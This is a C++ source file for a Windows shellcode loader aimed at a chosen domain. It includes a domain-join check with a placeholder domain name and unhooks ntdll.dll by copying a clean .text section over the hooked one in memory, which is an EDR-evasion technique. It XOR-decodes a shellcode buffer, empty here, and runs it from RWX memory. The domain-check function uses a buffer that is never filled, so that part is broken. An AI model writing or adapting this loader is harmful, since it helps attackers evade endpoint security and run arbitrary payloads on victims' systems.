#include <windows.h>
#include <stdio.h>
#include <iostream>
#define MULTI_LINE_STRING(a) #a
#pragma comment(linker, "/INCREMENTAL:YES")
#pragma comment(lib, "user32.lib")
#define WIN32_LEAN_AND_MEAN
#define MAX_BUFFER_SIZE 512
#define SECURITY_WIN32
#define __WIN32_WINNT 0x0A00
#include <secext.h>
#include <security.h>
#include <iostream>
#include <winternl.h>
#include <psapi.h>


#define UNICODE

BOOL Isdomainjoined(LPCWSTR domain) {
    WCHAR buffer[MAX_BUFFER_SIZE];
    BOOL bResult = FALSE;
    DWORD dwSize = MAX_BUFFER_SIZE;
    WCHAR* position = wcsstr(buffer, L"\\");

    position[0] = 0x00;
    if (wcscmp(domain, buffer) == 0) {
        bResult = TRUE;
    }

    return bResult;
}

int main(int argc, char** argv)
{
    if (!Isdomainjoined(L"//CHANGETHISFORDOMAIN")) {
    }
    else {

        HANDLE process = GetCurrentProcess();
        MODULEINFO modi = {};
        HMODULE ntMod = GetModuleHandleA("ntdll.dll");



        unsigned char buf[] = " ";
        char key[] = " ";
        char shellcode[sizeof buf];
        int j = 0;

        GetModuleInformation(process, ntMod, &modi, sizeof(modi));
        LPVOID ntdllBase = (LPVOID)modi.lpBaseOfDll;
        HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
        LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

        PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
        PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);



        for (int i = 0; i < sizeof buf; i++)
        {
            if (j == sizeof key - 1) j = 0;
            shellcode[i] = buf[i] ^ key[j];
            j++;
        }

        for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
            PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

            if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
                DWORD oldProtection = 0;
                bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
                memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
                isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
            }
        }

        void* bigedrenergy = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(bigedrenergy, shellcode, sizeof shellcode);
        ((void(*)())bigedrenergy)();

        CloseHandle(process);
        CloseHandle(ntdllFile);
        CloseHandle(ntdllMapping);
        FreeLibrary(ntMod);

        return 0;
    }

}
